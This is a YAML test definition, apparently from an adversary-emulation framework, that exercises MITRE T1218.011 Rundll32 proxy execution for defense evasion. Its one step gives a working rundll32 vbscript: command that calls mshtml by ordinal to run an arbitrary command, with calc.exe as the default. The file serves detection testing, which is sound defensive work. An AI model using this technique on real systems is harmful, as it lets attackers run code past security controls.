api_version: "2.0"
name: Rundll32 execute VBscript command using Ordinal number
description: |
    Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
    Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
    Upon execution calc.exe will be launched
args:
    - name: command_to_execute
      type: string
      default: calc.exe
uuid: 32d1cf1b-cbc2-4c09-8d05-07ec5c83a821
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1218: System Binary Proxy Execution'
    subtechniques:
        - 'T1218.011: Rundll32'
requirements:
    platforms:
        - os: windows
steps:
    - name: rundll32-execute-vbscript-command-using-ordinal-number
      inline: |
        rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("{{.Args.command_to_execute}}"),0)
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
